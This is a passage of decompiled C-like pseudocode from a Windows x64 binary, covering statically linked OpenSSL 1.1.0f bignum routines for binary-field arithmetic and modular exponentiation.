                            i = *(_QWORD *)&v13[8 * v49-- - 8];
                          }
                          v51 = sub_1400272A0(i);
                          v16 = v56;
                          v18 = v58;
                          v17 = v55;
                          v9 = ((_DWORD)v48 << 6) + v51;
                          v15 = v54;
                        }
                      }
                      sub_1400278D0((__int64)v57);
                      if ( sub_140026E90(a1, (__int64)v57) )
                        v7 = 1;
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
LABEL_54:
  sub_140027B60((__int64)a4);
  return v7;
}
// 14007AD07: conditional instruction was optimized away because r13d.4>=4
// 14007AD01: mask 0x80000003 is shortened because r13d.4 <= 0x7FFFFFFF

//----- (000000014007AEA0) ----------------------------------------------------
__int64 __fastcall sub_14007AEA0(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int *a5)
{
  unsigned int v9; // ebx
  int v10; // esi
  _DWORD *v11; // rax
  _DWORD *v12; // rdi
  int v13; // eax

  v9 = 0;
  v10 = sub_140027260(a4) + 1;
  v11 = sub_14001D8E0(4i64 * v10);
  v12 = v11;
  if ( v11 )
  {
    v13 = sub_14007B900(a4, (__int64)v11, v10);
    v9 = v13;
    if ( v13 && v13 <= v10 )
      v9 = sub_14007AF90(a1, a2, a3, v12, a5);
    else
      sub_140024610(3, 133, 106, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_gf2m.c", 486);
  }
  sub_14001D930(v12);
  return v9;
}

//----- (000000014007AF90) ----------------------------------------------------
__int64 __fastcall sub_14007AF90(__int64 a1, __int64 a2, __int64 a3, _DWORD *a4, int *a5)
{
  __int64 v5; // r14
  unsigned int v6; // ebx
  __int64 v7; // rbp
  _QWORD *v10; // rax
  unsigned __int64 v11; // r12
  int v12; // esi
  int v13; // r8d
  int v14; // ecx
  __int64 v15; // rcx
  int v16; // ecx
  int v17; // r8d
  int v18; // edi
  __int64 v19; // r14
  __int64 v20; // r9
  unsigned __int64 v21; // r10
  unsigned __int64 v22; // r11
  int v23; // ebp
  __int64 v24; // rsi
  bool v25; // zf
  unsigned __int64 v26; // rdi
  unsigned __int64 v27; // r13
  unsigned __int64 v28; // r8
  unsigned __int64 v29; // rcx
  unsigned __int64 v30; // rdi
  unsigned __int64 v31; // rdi
  unsigned __int64 v32; // rdx
  char *v33; // rax
  int v34; // [rsp+20h] [rbp-C8h]
  unsigned __int64 v35; // [rsp+28h] [rbp-C0h]
  __int64 v36; // [rsp+30h] [rbp-B8h]
  unsigned __int64 v37; // [rsp+38h] [rbp-B0h]
  unsigned __int64 v38; // [rsp+40h] [rbp-A8h]
  unsigned __int64 v39; // [rsp+48h] [rbp-A0h] BYREF
  unsigned __int64 v40; // [rsp+50h] [rbp-98h] BYREF
  __int64 v41; // [rsp+58h] [rbp-90h]
  int *v42; // [rsp+60h] [rbp-88h]
  _DWORD *v43; // [rsp+68h] [rbp-80h]
  __int64 v44; // [rsp+70h] [rbp-78h]
  unsigned __int64 v45; // [rsp+78h] [rbp-70h] BYREF
  unsigned __int64 v46; // [rsp+80h] [rbp-68h] BYREF
  unsigned __int64 v47; // [rsp+88h] [rbp-60h] BYREF
  unsigned __int64 v48; // [rsp+90h] [rbp-58h] BYREF

  v5 = (__int64)a5;
  v6 = 0;
  v43 = a4;
  v41 = a3;
  v7 = a3;
  v44 = a1;
  v42 = a5;
  if ( a2 == a3 )
    return sub_14007B640(a1, a2, a4, a5);
  sub_140027D40(a5);
  v10 = sub_140027C40(a5);
  v11 = (unsigned __int64)v10;
  if ( v10 )
  {
    v12 = *(_DWORD *)(v7 + 8) + 4 + *(_DWORD *)(a2 + 8);
    if ( sub_140027B30((__int64)v10, v12) )
    {
      *(_DWORD *)(v11 + 8) = v12;
      v13 = 0;
      if ( v12 >= 2 && (*(_QWORD *)v11 > v11 || *(_QWORD *)v11 + 8i64 * (v12 - 1) < v11) )
      {
        v14 = v12 - (v12 & 1);
        do
          v13 += 2;
        while ( v13 < v14 );
        memset(*(void **)v11, 0, 16i64 * ((v14 + 1) / 2));
      }
      v15 = v13;
      if ( v13 < (__int64)v12 )
      {
        do
          *(_QWORD *)(*(_QWORD *)v11 + 8 * v15++) = 0i64;
        while ( v15 < v12 );
      }
      v16 = *(_DWORD *)(v7 + 8);
      v17 = 0;
      v34 = 0;
      if ( v16 > 0 )
      {
        v18 = *(_DWORD *)(a2 + 8);
        v19 = 0i64;
        v20 = 0i64;
        v36 = 0i64;
        do
        {
          v21 = 0i64;
          v22 = *(_QWORD *)(*(_QWORD *)v7 + v20);
          v37 = v22;
          if ( v17 + 1 != v16 )
            v21 = *(_QWORD *)(*(_QWORD *)v7 + v20 + 8);
          v35 = v21;
          v23 = 0;
          if ( v18 > 0 )
          {
            v24 = v20;
            v38 = v22 ^ v21;
            do
            {
              v25 = v23 + 1 == v18;
              v26 = 0i64;
              v27 = *(_QWORD *)(v19 + v24 + *(_QWORD *)a2);
              if ( !v25 )
                v26 = *(_QWORD *)(v19 + v24 + *(_QWORD *)a2 + 8);
              sub_14007B9E0(&v48, &v47, v26, v21);
              sub_14007B9E0(&v46, &v45, v27, v37);
              sub_14007B9E0(&v39, &v40, v27 ^ v26, v38);
              v23 += 2;
              v28 = v48;
              v29 = v45;
              v30 = v48 ^ v46;
              *(_QWORD *)(v24 + *(_QWORD *)v11) ^= v45;
              v31 = v39 ^ v47 ^ v30;
              v32 = v40 ^ v39 ^ v31 ^ v28 ^ v29;
              v21 = v35;
              *(_QWORD *)(v24 + *(_QWORD *)v11 + 8) ^= v32;
              v33 = *(char **)v11;
              v47 = v31;
              v46 = v32;
              *(_QWORD *)&v33[v24 + 16] ^= v31;
              *(_QWORD *)(v24 + *(_QWORD *)v11 + 24) ^= v28;
              v24 += 16i64;
              v18 = *(_DWORD *)(a2 + 8);
            }
            while ( v23 < v18 );
            v17 = v34;
            v20 = v36;
          }
          v7 = v41;
          v17 += 2;
          v20 += 16i64;
          v34 = v17;
          v19 -= 16i64;
          v36 = v20;
          v16 = *(_DWORD *)(v41 + 8);
        }
        while ( v17 < v16 );
        v5 = (__int64)v42;
      }
      sub_1400278D0(v11);
      if ( (unsigned int)sub_14007A500(v44, v11, v43) )
        v6 = 1;
    }
  }
  sub_140027B60(v5);
  return v6;
}
// 14007B06E: conditional instruction was optimized away because esi.4>=2
// 14007B069: mask 0x80000001 is shortened because esi.4 <= 0x7FFFFFFF

//----- (000000014007B2C0) ----------------------------------------------------
__int64 __fastcall sub_14007B2C0(__int64 a1, __int64 a2, int *a3, int *a4)
{
  int v4; // r13d
  __int64 *v10; // r14
  _QWORD *v11; // rdi
  __int64 *v12; // r15
  unsigned int v13; // r12d
  int v14; // esi
  _QWORD *v15; // r12
  _QWORD *v16; // r14
  _QWORD *v17; // r13
  int v18; // esi
  int v19; // esi
  bool v20; // cc
  __int64 *v21; // [rsp+30h] [rbp-48h]
  int v23; // [rsp+90h] [rbp+18h]

  v4 = 0;
  v23 = 0;
  if ( !*a3 )
  {
    sub_140027560(a1, 0i64);
    return 1i64;
  }
  sub_140027D40(a4);
  v21 = sub_140027C40(a4);
  v10 = v21;
  v11 = sub_140027C40(a4);
  v12 = sub_140027C40(a4);
  if ( !v12 || !(unsigned int)sub_14007A500((__int64)v21, a2, a3) )
  {
LABEL_31:
    v13 = 0;
    goto LABEL_32;
  }
  if ( !sub_140027160((__int64)v21) )
  {
    if ( (*(_BYTE *)a3 & 1) != 0 )
    {
      if ( sub_140026E90((__int64)v11, (__int64)v21) )
      {
        v14 = 1;
        if ( (*a3 - 1) / 2 < 1 )
        {
LABEL_34:
          if ( (unsigned int)sub_14007B640((__int64)v12, (__int64)v11, a3, a4)
            && (unsigned int)sub_14007A380((__int64)v12, (__int64)v11, (__int64)v12) )
          {
            if ( !(unsigned int)sub_140027600(v12, v10) )
            {
              if ( sub_140026E90(a1, (__int64)v11) )
                v4 = 1;
              v13 = v4;
              goto LABEL_32;
            }
            sub_140024610(3, 135, 116, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_gf2m.c", 1124);
          }
        }
        else
        {
          while ( (unsigned int)sub_14007B640((__int64)v11, (__int64)v11, a3, a4)
               && (unsigned int)sub_14007B640((__int64)v11, (__int64)v11, a3, a4)
               && (unsigned int)sub_14007A380((__int64)v11, (__int64)v11, (__int64)v21) )
          {
            if ( ++v14 > (*a3 - 1) / 2 )
              goto LABEL_34;
          }
        }
      }
    }
    else
    {
      v15 = sub_140027C40(a4);
      v16 = sub_140027C40(a4);
      v17 = sub_140027C40(a4);
      if ( v17 )
      {
        v18 = 1;
        while ( (unsigned int)sub_1400282E0((__int64)v15, *a3, 0, 0) )
        {
          if ( !(unsigned int)sub_14007A500((__int64)v15, (__int64)v15, a3) )
            break;
          sub_140027560((__int64)v11, 0i64);
          if ( !sub_140026E90((__int64)v12, (__int64)v15) )
            break;
          if ( *a3 - 1 >= 1 )
          {
            while ( (unsigned int)sub_14007B640((__int64)v11, (__int64)v11, a3, a4)
                 && (unsigned int)sub_14007B640((__int64)v16, (__int64)v12, a3, a4)
                 && (unsigned int)sub_14007AF90((__int64)v17, (__int64)v16, (__int64)v21, a3, a4)
                 && (unsigned int)sub_14007A380((__int64)v11, (__int64)v11, (__int64)v17)
                 && (unsigned int)sub_14007A380((__int64)v12, (__int64)v16, (__int64)v15) )
            {
              if ( ++v18 > *a3 - 1 )
                goto LABEL_27;
            }
            goto LABEL_31;
          }
LABEL_27:
          v19 = ++v23;
          if ( sub_140027160((__int64)v12) )
          {
            v20 = v19 < 50;
            v18 = 1;
            if ( v20 )
              continue;
          }
          if ( sub_140027160((__int64)v12) )
          {
            sub_140024610(3, 135, 113, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_gf2m.c", 1114);
            goto LABEL_31;
          }
          v10 = v21;
          v4 = 0;
          goto LABEL_34;
        }
      }
    }
    goto LABEL_31;
  }
  sub_140027560(a1, 0i64);
  v13 = 1;
LABEL_32:
  sub_140027B60((__int64)a4);
  return v13;
}

//----- (000000014007B640) ----------------------------------------------------
__int64 __fastcall sub_14007B640(__int64 a1, __int64 a2, _DWORD *a3, int *a4)
{
  unsigned int v8; // edi
  _QWORD *v9; // rax
  __int64 v10; // rbx
  int v11; // eax
  __int64 v12; // r10
  __int64 v13; // r11
  unsigned __int64 v14; // r9
  __int64 v15; // rcx

  v8 = 0;
  sub_140027D40(a4);
  v9 = sub_140027C40(a4);
  v10 = (__int64)v9;
  if ( v9 && sub_140027B30((__int64)v9, 2 * *(_DWORD *)(a2 + 8)) )
  {
    v11 = *(_DWORD *)(a2 + 8) - 1;
    v12 = v11;
    if ( v11 >= 0 )
    {
      v13 = 16i64 * v11;
      do
      {
        v14 = *(_QWORD *)(*(_QWORD *)a2 + 8 * v12);
        *(_QWORD *)(v13 + *(_QWORD *)v10 + 8) = qword_14010F320[BYTE4(v14) & 0xF] | ((qword_14010F320[(v14 >> 36) & 0xF] | ((qword_14010F320[(v14 >> 40) & 0xF] | ((qword_14010F320[(v14 >> 44) & 0xF] | ((qword_14010F320[HIWORD(v14) & 0xF] | ((qword_14010F320[(v14 >> 52) & 0xF] | (((qword_14010F320[v14 >> 60] << 8) | qword_14010F320[HIBYTE(v14) & 0xF]) << 8)) << 8)) << 8)) << 8)) << 8)) << 8);
        v15 = qword_14010F320[*(_QWORD *)(*(_QWORD *)a2 + 8 * v12) & 0xFi64] | ((qword_14010F320[(*(_QWORD *)(*(_QWORD *)a2 + 8 * v12) >> 4) & 0xFi64] | ((qword_14010F320[(*(_QWORD *)(*(_QWORD *)a2 + 8 * v12) >> 8) & 0xFi64] | ((qword_14010F320[(unsigned __int8)HIBYTE(*(_WORD *)(*(_QWORD *)a2 + 8 * v12)) >> 4] | ((qword_14010F320[(*(_QWORD *)(*(_QWORD *)a2 + 8 * v12) >> 16) & 0xFi64] | ((qword_14010F320[(*(_QWORD *)(*(_QWORD *)a2 + 8 * v12) >> 20) & 0xFi64] | ((qword_14010F320[(*(_QWORD *)(*(_QWORD *)a2 + 8 * v12) >> 24) & 0xFi64] | (qword_14010F320[(unsigned __int8)HIBYTE(*(_DWORD *)(*(_QWORD *)a2 + 8 * v12)) >> 4] << 8)) << 8)) << 8)) << 8)) << 8)) << 8)) << 8);
        --v12;
        v13 -= 16i64;
        *(_QWORD *)(v13 + *(_QWORD *)v10 + 16) = v15;
      }
      while ( v12 >= 0 );
    }
    *(_DWORD *)(v10 + 8) = 2 * *(_DWORD *)(a2 + 8);
    sub_1400278D0(v10);
    if ( (unsigned int)sub_14007A500(a1, v10, a3) )
      v8 = 1;
  }
  sub_140027B60((__int64)a4);
  return v8;
}
// 14010F320: using guessed type _QWORD qword_14010F320[16];

//----- (000000014007B850) ----------------------------------------------------
__int64 __fastcall sub_14007B850(__int64 a1, __int64 a2, _DWORD *a3, int *a4)
{
  unsigned int v4; // ebp
  _QWORD *v10; // rax
  __int64 v11; // rdi

  v4 = 0;
  if ( *a3 )
  {
    sub_140027D40(a4);
    v10 = sub_140027C40(a4);
    v11 = (__int64)v10;
    if ( v10 )
    {
      if ( (unsigned int)sub_140027480((__int64)v10, *a3 - 1) )
        v4 = sub_14007A840(a1, a2, v11, a3, a4);
    }
    sub_140027B60((__int64)a4);
    return v4;
  }
  else
  {
    sub_140027560(a1, 0i64);
    return 1i64;
  }
}

//----- (000000014007B900) ----------------------------------------------------
__int64 __fastcall sub_14007B900(__int64 a1, __int64 a2, int a3)
{
  __int64 v3; // rbp
  int v6; // ebx
  int v8; // r11d
  __int64 v9; // rcx
  int v10; // r10d
  __int64 v11; // r9
  unsigned __int64 v12; // r8
  int i; // edx
  __int64 v14; // rcx

  v3 = a3;
  v6 = 0;
  if ( sub_140027160(a1) )
    return 0i64;
  v8 = *(_DWORD *)(a1 + 8) - 1;
  if ( v8 >= 0 )
  {
    v9 = 0i64;
    v10 = v8 << 6;
    v11 = 8i64 * v8;
    do
    {
      if ( *(_QWORD *)(v11 + *(_QWORD *)a1) )
      {
        v12 = 0x8000000000000000ui64;
        for ( i = 63; i >= 0; --i )
        {
          if ( (v12 & *(_QWORD *)(v11 + *(_QWORD *)a1)) != 0 )
          {
            if ( v9 < v3 )
              *(_DWORD *)(a2 + 4 * v9) = v10 + i;
            ++v6;
            ++v9;
          }
          v12 >>= 1;
        }
      }
      v10 -= 64;
      v11 -= 8i64;
      --v8;
    }
    while ( v8 >= 0 );
  }
  if ( v6 < (int)v3 )
  {
    v14 = v6++;
    *(_DWORD *)(a2 + 4 * v14) = -1;
  }
  return (unsigned int)v6;
}

//----- (000000014007B9E0) ----------------------------------------------------
unsigned __int64 __fastcall sub_14007B9E0(
        unsigned __int64 *a1,
        unsigned __int64 *a2,
        unsigned __int64 a3,
        unsigned __int64 a4)
{
  unsigned __int64 v6; // r11
  unsigned __int64 v7; // rax
  unsigned __int64 v8; // rdx
  __int64 v9; // r8
  unsigned __int64 v10; // rax
  unsigned __int64 v11; // rdx
  unsigned __int64 v12; // r8
  unsigned __int64 v13; // rax
  unsigned __int64 v14; // rcx
  unsigned __int64 v15; // r8
  unsigned __int64 v16; // rax
  unsigned __int64 v17; // r8
  unsigned __int64 v18; // rdx
  unsigned __int64 v19; // rax
  unsigned __int64 v20; // rdx
  unsigned __int64 v21; // r8
  unsigned __int64 v22; // rax
  unsigned __int64 v23; // rdx
  unsigned __int64 v24; // r8
  unsigned __int64 v25; // rax
  unsigned __int64 v26; // rdx
  unsigned __int64 v27; // r8
  unsigned __int64 v28; // rax
  unsigned __int64 v29; // rdx
  unsigned __int64 v30; // r8
  unsigned __int64 v31; // rax
  unsigned __int64 v32; // rdx
  unsigned __int64 v33; // r8
  unsigned __int64 v34; // rax
  unsigned __int64 v35; // rdx
  unsigned __int64 v36; // r8
  unsigned __int64 v37; // rax
  unsigned __int64 v38; // rdx
  unsigned __int64 v39; // r8
  unsigned __int64 v40; // rax
  unsigned __int64 v41; // rcx
  unsigned __int64 v42; // r8
  unsigned __int64 v43; // rax
  unsigned __int64 v44; // r8
  unsigned __int64 v45; // rdx
  unsigned __int64 v46; // rax
  unsigned __int64 v47; // rdx
  unsigned __int64 v48; // r8
  unsigned __int64 v49; // rax
  unsigned __int64 v50; // rcx
  unsigned __int64 result; // rax
  unsigned __int64 v52; // rdx
  unsigned __int64 v53; // r8
  __int64 v54[2]; // [rsp+0h] [rbp-39h]
  unsigned __int64 v55; // [rsp+10h] [rbp-29h]
  unsigned __int64 v56; // [rsp+18h] [rbp-21h]
  unsigned __int64 v57; // [rsp+20h] [rbp-19h]
  unsigned __int64 v58; // [rsp+28h] [rbp-11h]
  unsigned __int64 v59; // [rsp+30h] [rbp-9h]
  unsigned __int64 v60; // [rsp+38h] [rbp-1h]
  unsigned __int64 v61; // [rsp+40h] [rbp+7h]
  unsigned __int64 v62; // [rsp+48h] [rbp+Fh]
  unsigned __int64 v63; // [rsp+50h] [rbp+17h]
  unsigned __int64 v64; // [rsp+58h] [rbp+1Fh]
  unsigned __int64 v65; // [rsp+60h] [rbp+27h]
  unsigned __int64 v66; // [rsp+68h] [rbp+2Fh]
  unsigned __int64 v67; // [rsp+70h] [rbp+37h]
  unsigned __int64 v68; // [rsp+78h] [rbp+3Fh]

  v54[0] = 0i64;
  v6 = a3 >> 61;
  v54[1] = a3 & 0x1FFFFFFFFFFFFFFFi64;
  v55 = 2 * (a3 & 0x1FFFFFFFFFFFFFFFi64);
  v57 = 4 * (a3 & 0x1FFFFFFFFFFFFFFFi64);
  v61 = 8 * a3;
  v56 = a3 & 0x1FFFFFFFFFFFFFFFi64 ^ v55;
  v58 = a3 & 0x1FFFFFFFFFFFFFFFi64 ^ v57;
  v59 = v55 ^ v57;
  v60 = a3 & 0x1FFFFFFFFFFFFFFFi64 ^ v55 ^ v57;
  v62 = a3 & 0x1FFFFFFFFFFFFFFFi64 ^ (8 * a3);
  v63 = v55 ^ (8 * a3);
  v64 = a3 & 0x1FFFFFFFFFFFFFFFi64 ^ v63;
  v65 = v57 ^ (8 * a3);
  v66 = a3 & 0x1FFFFFFFFFFFFFFFi64 ^ v65;
  v67 = v55 ^ v65;
  v68 = a3 & 0x1FFFFFFFFFFFFFFFi64 ^ v55 ^ v65;
  v7 = v54[(unsigned __int8)a4 >> 4];
  v8 = v7 >> 60;
  v9 = (16 * v7) ^ v54[a4 & 0xF];
  v10 = v54[(a4 >> 8) & 0xF];
  v11 = HIBYTE(v10) ^ v8;
  v12 = (v10 << 8) ^ v9;
  v13 = v54[(unsigned __int16)a4 >> 12];
  v14 = v13 >> 52;
  v15 = (v13 << 12) ^ v12;
  v16 = v54[(a4 >> 16) & 0xF];
  v17 = (v16 << 16) ^ v15;
  v18 = HIWORD(v16) ^ v14 ^ v11;
  v19 = v54[(a4 >> 20) & 0xF];
  v20 = (v19 >> 44) ^ v18;
  v21 = (v19 << 20) ^ v17;
  v22 = v54[(a4 >> 24) & 0xF];
  v23 = (v22 >> 40) ^ v20;
  v24 = (v22 << 24) ^ v21;
  v25 = v54[(unsigned int)a4 >> 28];
  v26 = (v25 >> 36) ^ v23;
  v27 = (v25 << 28) ^ v24;
  v28 = v54[BYTE4(a4) & 0xF];
  v29 = HIDWORD(v28) ^ v26;
  v30 = (v28 << 32) ^ v27;
  v31 = v54[(a4 >> 36) & 0xF];
  v32 = (v31 >> 28) ^ v29;
  v33 = (v31 << 36) ^ v30;
  v34 = v54[(a4 >> 40) & 0xF];
  v35 = (v34 >> 24) ^ v32;
  v36 = (v34 << 40) ^ v33;
  v37 = v54[(a4 >> 44) & 0xF];
  v38 = (v37 >> 20) ^ v35;
  v39 = (v37 << 44) ^ v36;
  v40 = v54[HIWORD(a4) & 0xF];
  v41 = v40 >> 16;
  v42 = (v40 << 48) ^ v39;
  v43 = v54[(a4 >> 52) & 0xF];
  v44 = (v43 << 52) ^ v42;
  v45 = (v43 >> 12) ^ v41 ^ v38;
  v46 = v54[HIBYTE(a4) & 0xF];
  v47 = (v46 >> 8) ^ v45;
  v48 = (v46 << 56) ^ v44;
  v49 = v54[a4 >> 60];
  v50 = v49 >> 4;
  result = v49 << 60;
  v52 = v50 ^ v47;
  v53 = result ^ v48;
  if ( (v6 & 1) != 0 )
  {
    v53 ^= a4 << 61;
    result = a4 >> 3;
    v52 ^= a4 >> 3;
  }
  if ( (v6 & 2) != 0 )
  {
    v53 ^= a4 << 62;
    result = a4 >> 2;
    v52 ^= a4 >> 2;
  }
  if ( (v6 & 4) != 0 )
  {
    result = a4 << 63;
    v53 ^= a4 << 63;
    v52 ^= a4 >> 1;
  }
  *a1 = v52;
  *a2 = v53;
  return result;
}

//----- (000000014007BD10) ----------------------------------------------------
__int64 __fastcall sub_14007BD10(_QWORD *a1, __int64 a2, __int64 a3, unsigned __int64 a4, int *a5)
{
  if ( !sub_1400270F0(a4) )
    return sub_14007CE60(a1, a2, a3, a4, a5);
  if ( *(_DWORD *)(a2 + 8) != 1 || *(_DWORD *)(a2 + 16) || (unsigned int)sub_140027070(a3, 4u) )
    return sub_14007BDF0((__int64)a1, a2, a3, a4, a5, 0i64);
  return sub_14007CA40((__int64)a1, **(_QWORD **)a2, a3, a4, a5, 0i64);
}

//----- (000000014007BDF0) ----------------------------------------------------
__int64 __fastcall sub_14007BDF0(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4, int *a5, __int64 a6)
{
  int *v6; // r15
  unsigned int v7; // ebp
  __int64 v12; // r12
  int v14; // r13d
  _QWORD *v15; // r14
  _QWORD *v16; // rax
  __int64 v17; // rsi
  _DWORD *v18; // rax
  __int64 v19; // rbx
  __int64 v20; // rsi
  _QWORD *v21; // rax
  __int64 v22; // rsi
  int v23; // r13d
  unsigned int v24; // ebx
  int v25; // r8d
  _QWORD *v26; // r10
  __int64 *v27; // r9
  unsigned __int64 v28; // rdx
  unsigned __int64 v29; // rcx
  int v30; // ebx
  __m128i si128; // xmm1
  __int64 v32; // rax
  __int64 i; // rdx
  void **v34; // rax
  int v35; // ebx
  int v36; // edi
  int v37; // ebx
  int v38; // esi
  int v39; // ebp
  int v40; // edi
  char v41; // cl
  int v42; // edi
  int v43; // ebx
  bool v44; // sf
  unsigned int v45; // [rsp+30h] [rbp-198h]
  _QWORD *v46; // [rsp+38h] [rbp-190h]
  int v47; // [rsp+38h] [rbp-190h]
  unsigned int v48; // [rsp+40h] [rbp-188h]
  __int64 v51; // [rsp+60h] [rbp-168h]
  int *v52; // [rsp+68h] [rbp-160h]
  __int64 v53[32]; // [rsp+70h] [rbp-158h]

  v6 = a5;
  LOBYTE(v7) = 4;
  v52 = a5;
  v48 = 0;
  v45 = 4;
  v12 = 0i64;
  if ( (unsigned int)sub_140027070(a3, 4u) )
    return sub_14007C360(a1, (__int64 *)a2, a3, a4, a5, a6);
  if ( !sub_1400270F0(a4) )
  {
    sub_140024610(3, 109, 102, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_exp.c", 321);
    return 0i64;
  }
  v14 = sub_140027260(a3);
  if ( v14 )
  {
    sub_140027D40(a5);
    v46 = sub_140027C40(a5);
    v15 = sub_140027C40(a5);
    v16 = sub_140027C40(a5);
    v17 = (__int64)v16;
    v53[0] = (__int64)v16;
    if ( !v46 || !v15 || !v16 )
      goto LABEL_74;
    if ( a6 )
    {
      v12 = a6;
    }
    else
    {
      v18 = sub_14003C400();
      v12 = (__int64)v18;
      if ( !v18 || !(unsigned int)sub_14003C480((__int64)v18, (__int64 **)a4, a5) )
        goto LABEL_75;
    }
    if ( *(_DWORD *)(a2 + 16) || (int)sub_140027600((__int64 *)a2, (__int64 *)a4) >= 0 )
    {
      if ( !(unsigned int)sub_1400798F0(v17, a2, a4, a5) )
        goto LABEL_74;
      a2 = v17;
    }
    if ( sub_140027160(a2) )
    {
      sub_140027560(a1, 0i64);
      v48 = 1;
      goto LABEL_74;
    }
    if ( !(unsigned int)sub_1400275D0(v17, a2, v12, a5) )
      goto LABEL_74;
    v19 = 1i64;
    if ( v14 <= 671 )
    {
      if ( v14 <= 239 )
      {
        if ( v14 <= 79 )
        {
          v7 = 1;
          if ( v14 > 23 )
            v7 = 3;
          v45 = v7;
          if ( v7 <= 1 )
          {
LABEL_36:
            v22 = *(int *)(a4 + 8);
            v23 = v14 - 1;
            v47 = 1;
            v24 = v22 - 1;
            v51 = 8i64 * ((int)v22 - 1);
            if ( *(__int64 *)(v51 + *(_QWORD *)a4) >= 0 )
            {
              v34 = sub_140027650();
              if ( !(unsigned int)sub_1400275D0((__int64)v15, (__int64)v34, v12, a5) )
                goto LABEL_74;
            }
            else
            {
              if ( !sub_140027B30((__int64)v15, v22) )
                goto LABEL_74;
              v25 = 1;
              *(_QWORD *)*v15 = -**(_QWORD **)a4;
              if ( (int)v22 > 1 && v24 >= 4 )
              {
                v26 = (_QWORD *)*v15;
                v27 = *(__int64 **)a4;
                v28 = *v15 + 8i64;
                v29 = v51 + *v15;
                if ( (v28 > *(_QWORD *)a4 + v51 || v29 < *(_QWORD *)a4 + 8i64)
                  && (v28 > (unsigned __int64)v15 || v29 < (unsigned __int64)v15)
                  && (v28 > a4 || v29 < a4) )
                {
                  v30 = (int)v24 % 4;
                  si128 = _mm_load_si128((const __m128i *)&xmmword_14010E690);
                  v32 = 1i64;
                  do
                  {
                    v25 += 4;
                    *(__m128i *)&v26[v32] = _mm_andnot_si128(_mm_loadu_si128((const __m128i *)&v27[v32]), si128);
                    *(__m128i *)&v26[v32 + 2] = _mm_andnot_si128(_mm_loadu_si128((const __m128i *)&v27[v32 + 2]), si128);
                    v32 += 4i64;
                  }
                  while ( v32 < (int)v22 - v30 );
                }
              }
              for ( i = v25; i < v22; ++i )
                *(_QWORD *)(*v15 + 8 * i) = ~*(_QWORD *)(*(_QWORD *)a4 + 8 * i);
              *((_DWORD *)v15 + 2) = v22;
              sub_1400278D0((__int64)v15);
            }
            v35 = 1;
            v36 = 0;
            while ( 1 )
            {
              while ( !(unsigned int)sub_1400270A0(a3, v23) )
              {
                if ( !v35 && !(unsigned int)sub_14003CA60((__int64)v15, (__int64)v15, (__int64)v15, v12, v6) )
                  goto LABEL_74;
                if ( !v23 )
                {
LABEL_71:
                  if ( (unsigned int)sub_14003C750(a1, (__int64)v15, v12, v6) )
                    v36 = 1;
                  v48 = v36;
                  goto LABEL_74;
                }
                --v23;
              }
              v37 = 1;
              v38 = 1;
              v39 = 0;
              if ( v45 > 1 )
              {
                v40 = v23 - 1;
                do
                {
                  if ( v40 < 0 )
                    break;
                  if ( (unsigned int)sub_1400270A0(a3, v40) )
                  {
                    v41 = v37 - v39;
                    v39 = v37;
                    v38 = (v38 << v41) | 1;
                  }
                  ++v37;
                  --v40;
                }
                while ( v37 < (int)v45 );
                v6 = v52;
              }
              v42 = v39 + 1;
              if ( !v47 )
              {
                v43 = 0;
                if ( v42 > 0 )
                  break;
              }
LABEL_69:
              if ( !(unsigned int)sub_14003CA60((__int64)v15, (__int64)v15, v53[(__int64)v38 >> 1], v12, v6) )
                goto LABEL_74;
              v36 = 0;
              v47 = 0;
              v44 = -1 - v39 + v23 < 0;
              v23 += -1 - v39;
              v35 = 0;
              if ( v44 )
                goto LABEL_71;
            }
            while ( (unsigned int)sub_14003CA60((__int64)v15, (__int64)v15, (__int64)v15, v12, v6) )
            {
              if ( ++v43 >= v42 )
                goto LABEL_69;
            }
LABEL_74:
            if ( a6 )
            {
LABEL_76:
              sub_140027B60((__int64)v6);
              return v48;
            }
LABEL_75:
            sub_14003C3A0(v12);
            goto LABEL_76;
          }
        }
      }
      else
      {
        LOBYTE(v7) = 5;
        v45 = 5;
      }
    }
    else
    {
      LOBYTE(v7) = 6;
      v45 = 6;
    }
    if ( !(unsigned int)sub_14003CA60((__int64)v46, v17, v17, v12, a5) )
      goto LABEL_74;
    v20 = 1 << (v7 - 1);
    if ( v20 > 1 )
    {
      while ( 1 )
      {
        v21 = sub_140027C40(a5);
        v53[v19] = (__int64)v21;
        if ( !v21 || !(unsigned int)sub_14003CA60((__int64)v21, v53[v19 - 1], (__int64)v46, v12, a5) )
          goto LABEL_74;
        if ( ++v19 >= v20 )
          goto LABEL_36;
      }
    }
    goto LABEL_36;
  }
  if ( !sub_140027110(a4) )
    return sub_140027560(a1, 1i64);
  sub_140027560(a1, 0i64);
  return 1i64;
}
// 14010E690: using guessed type __int128 xmmword_14010E690;
// 14007BDF0: using guessed type __int64 var_158[32];

//----- (000000014007C360) ----------------------------------------------------
__int64 __fastcall sub_14007C360(__int64 a1, __int64 *a2, __int64 a3, unsigned __int64 a4, int *a5, __int64 a6)
{
  unsigned int v6; // esi
  unsigned __int64 v9; // rdi
  int v12; // ebx
  int *v13; // r15
  __int64 v14; // r14
  _DWORD *v15; // rax
  int v16; // esi
  int v17; // r12d
  int v18; // edx
  int v19; // edx
  size_t v20; // rcx
  __int64 v21; // rax
  void *v22; // rsp
  __int64 v23; // r8
  __int64 v24; // rax
  unsigned int v25; // ecx
  __int64 i; // rdx
  __int64 v27; // r11
  __int64 *v28; // rax
  __int64 *v29; // r9
  unsigned __int64 v30; // r11
  __m128i si128; // xmm1
  int v32; // eax
  __int64 v33; // rcx
  void **v34; // rax
  __int64 *v35; // rdi
  int v36; // edi
  int v37; // ecx
  __int64 v38; // r9
  int v39; // r11d
  __int64 v40; // rdx
  _QWORD *v41; // r8
  __int64 v42; // r10
  __int64 v43; // rcx
  int v44; // ecx
  __int64 v45; // r9
  __int64 v46; // rdx
  _QWORD *v47; // r8
  __int64 v48; // rcx
  int v49; // ecx
  __int64 v50; // r9
  int v51; // edi
  __int64 v52; // rdx
  _QWORD *v53; // r8
  __int64 v54; // r10
  __int64 v55; // rcx
  __int64 v56; // rdx
  int v57; // ecx
  __int64 v58; // r9
  char *v59; // r8
  __int64 v60; // rcx
  int v61; // ebx
  int v62; // esi
  int v63; // edi
